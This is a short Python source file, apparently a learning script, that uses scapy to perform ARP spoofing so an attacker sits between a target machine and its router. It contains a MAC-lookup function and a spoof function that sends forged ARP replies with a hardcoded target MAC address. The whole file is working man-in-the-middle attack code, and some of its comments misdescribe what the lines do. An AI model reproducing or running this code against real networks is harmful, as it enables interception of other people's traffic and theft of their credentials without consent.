import scapy.all as scapy
# We will be getting data from user as we are router
# Simple behaviour: target -> router
# Our attack: target -> hacker -> router
# psrc - our router ip
# pdst - target ip
# hwdst - target mac address


def get_mac(ip):
    arp_request = scapy.ARP(pdst = ip) # get an ip of our computer
    broadcast = scapy.Ether(dst = "ff:ff:ff:ff:ff:ff") # get a mac address of our computer
    arp_request_brodcast = broadcast/arp_request # arp_request + broadcast
    answered_list = scapy.srp(arp_request_brodcast, timeout=1)[0]
    mac_address = answered_list[0][1].hwsrc
    return mac_address


def spoof(target_ip, spoof_ip):
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst="08:00:27:9f:13:ae", psrc=spoof_ip)
    scapy.send(packet)


